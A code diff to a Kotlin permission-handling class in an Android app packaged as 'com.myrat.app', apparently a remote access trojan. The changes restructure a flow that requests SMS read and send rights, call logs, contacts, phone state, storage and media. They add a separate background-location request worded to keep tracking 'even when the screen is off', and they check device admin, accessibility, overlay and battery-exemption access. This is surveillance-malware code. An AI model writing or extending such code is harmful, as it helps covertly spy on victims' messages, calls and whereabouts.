@@ -6,12 +6,10 @@ import android.app.AppOpsManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.PowerManager
 import android.provider.Settings
-import androidx.core.content.ContextCompat
 import com.guolindev.permissionx.PermissionX
 import com.myrat.app.utils.Logger
 import java.lang.ref.WeakReference
@@ -24,50 +22,52 @@ class PermissionHandler(
     private var currentStep = 0
     private val totalSteps = 6
     
-    // Only permissions that actually require runtime requests
-    private val runtimePermissions = listOf(
-        Manifest.permission.RECEIVE_SMS,
-        Manifest.permission.READ_SMS,
-        Manifest.permission.SEND_SMS,
-        Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.READ_PHONE_NUMBERS,
-        Manifest.permission.CALL_PHONE,
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.READ_CONTACTS,
-        Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.READ_EXTERNAL_STORAGE
-    ).let { permissions ->
-        // Add Android 13+ specific permissions
+    // Only permissions that actually require runtime requests according to PermissionX docs
+    private val runtimePermissions = mutableListOf<String>().apply {
+        // Core SMS and Phone permissions
+        add(Manifest.permission.RECEIVE_SMS)
+        add(Manifest.permission.READ_SMS)
+        add(Manifest.permission.SEND_SMS)
+        add(Manifest.permission.READ_PHONE_STATE)
+        add(Manifest.permission.CALL_PHONE)
+        
+        // Location permissions
+        add(Manifest.permission.ACCESS_FINE_LOCATION)
+        add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        
+        // Contact and Call log permissions
+        add(Manifest.permission.READ_CONTACTS)
+        add(Manifest.permission.READ_CALL_LOG)
+        
+        // Storage permissions (conditional)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions + listOf(
-                Manifest.permission.READ_MEDIA_IMAGES,
-                Manifest.permission.POST_NOTIFICATIONS
-            )
+            add(Manifest.permission.READ_MEDIA_IMAGES)
+            add(Manifest.permission.POST_NOTIFICATIONS)
         } else {
-            permissions
+            add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
-    }.let { permissions ->
-        // Add background location for Android 10+
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            permissions + Manifest.permission.ACCESS_BACKGROUND_LOCATION
-        } else {
-            permissions
+        
+        // Phone number permission (conditional)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            add(Manifest.permission.READ_PHONE_NUMBERS)
         }
+        
+        // Background location (separate request as per PermissionX docs)
+        // Will be requested separately after foreground location
     }
 
     fun requestPermissions() {
         val activity = activityRef.get() ?: return
         
-        Logger.log("Starting permission flow with PermissionX")
+        Logger.log("Starting PermissionX permission flow")
         currentStep = 1
         
-        // Step 1: Request runtime permissions using PermissionX
-        requestRuntimePermissions(activity)
+        // Step 1: Request core runtime permissions first
+        requestCorePermissions(activity)
     }
 
-    private fun requestRuntimePermissions(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Requesting runtime permissions")
+    private fun requestCorePermissions(activity: Activity) {
+        Logger.log("Step $currentStep/$totalSteps: Requesting core runtime permissions")
         
         PermissionX.init(activity)
             .permissions(runtimePermissions)
@@ -80,22 +80,62 @@ class PermissionHandler(
                 scope.showForwardToSettingsDialog(deniedList, message, "Settings", "Cancel")
             }
             .request { allGranted, grantedList, deniedList ->
-                Logger.log("Runtime permissions result - Granted: ${grantedList.size}, Denied: ${deniedList.size}")
+                Logger.log("Core permissions result - All granted: $allGranted")
+                Logger.log("Granted: ${grantedList.size}, Denied: ${deniedList.size}")
                 
                 if (deniedList.isNotEmpty()) {
-                    Logger.warn("Some permissions denied: $deniedList")
+                    Logger.warn("Some core permissions denied: $deniedList")
                 }
                 
-                // Continue to next step regardless of some denials
+                // Continue to background location if foreground location was granted
                 currentStep++
-                requestSpecialPermissions(activity)
+                if (grantedList.contains(Manifest.permission.ACCESS_FINE_LOCATION) || 
+                    grantedList.contains(Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                    requestBackgroundLocation(activity)
+                } else {
+                    requestSpecialPermissions(activity)
+                }
             }
     }
 
+    private fun requestBackgroundLocation(activity: Activity) {
+        // Background location requires separate request as per PermissionX docs
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            Logger.log("Step $currentStep/$totalSteps: Requesting background location")
+            
+            PermissionX.init(activity)
+                .permissions(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                .onExplainRequestReason { scope, deniedList ->
+                    scope.showRequestReasonDialog(
+                        deniedList,
+                        "Background location access is needed to track location when the app is not actively being used. This enables location monitoring even when the screen is off.",
+                        "Grant",
+                        "Deny"
+                    )
+                }
+                .onForwardToSettings { scope, deniedList ->
+                    scope.showForwardToSettingsDialog(
+                        deniedList,
+                        "Background location was denied. Please go to Settings > App Permissions > Location and select 'Allow all the time'.",
+                        "Settings",
+                        "Cancel"
+                    )
+                }
+                .request { allGranted, grantedList, deniedList ->
+                    Logger.log("Background location result - Granted: $allGranted")
+                    currentStep++
+                    requestSpecialPermissions(activity)
+                }
+        } else {
+            currentStep++
+            requestSpecialPermissions(activity)
+        }
+    }
+
     private fun requestSpecialPermissions(activity: Activity) {
-        Logger.log("Step $currentStep/$totalSteps: Requesting special permissions")
+        Logger.log("Step $currentStep/$totalSteps: Checking special permissions")
         
-        // Check and request special permissions that don't require runtime requests
+        // These are NOT runtime permissions and should be handled via Settings intents
         val specialPermissions = mutableListOf<String>()
         
         // Battery optimization
@@ -502,9 +542,14 @@ class PermissionHandler(
     fun areAllPermissionsGranted(): Boolean {
         val activity = activityRef.get() ?: return false
         
-        // Check runtime permissions
-        val runtimeGranted = runtimePermissions.all { permission ->
-            ContextCompat.checkSelfPermission(activity, permission) == PackageManager.PERMISSION_GRANTED
+        // Check runtime permissions using PermissionX
+        val runtimeGranted = PermissionX.isGranted(activity, *runtimePermissions.toTypedArray())
+        
+        // Check background location separately
+        val backgroundLocationGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            PermissionX.isGranted(activity, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+        } else {
+            true
         }
         
         // Check special permissions
@@ -524,9 +569,9 @@ class PermissionHandler(
             true
         }
         
-        Logger.log("Permission status - Runtime: $runtimeGranted, Battery: $batteryOptimized, Overlay: $overlayGranted, DeviceAdmin: $deviceAdminGranted, Accessibility: $accessibilityGranted, ExactAlarms: $exactAlarmsGranted")
+        Logger.log("Permission status - Runtime: $runtimeGranted, Background: $backgroundLocationGranted, Battery: $batteryOptimized, Overlay: $overlayGranted, DeviceAdmin: $deviceAdminGranted, Accessibility: $accessibilityGranted, ExactAlarms: $exactAlarmsGranted")
         
-        return runtimeGranted && batteryOptimized && overlayGranted && deviceAdminGranted && accessibilityGranted && exactAlarmsGranted
+        return runtimeGranted && backgroundLocationGranted && batteryOptimized && overlayGranted && deviceAdminGranted && accessibilityGranted && exactAlarmsGranted
     }
 
     fun handleResume() {
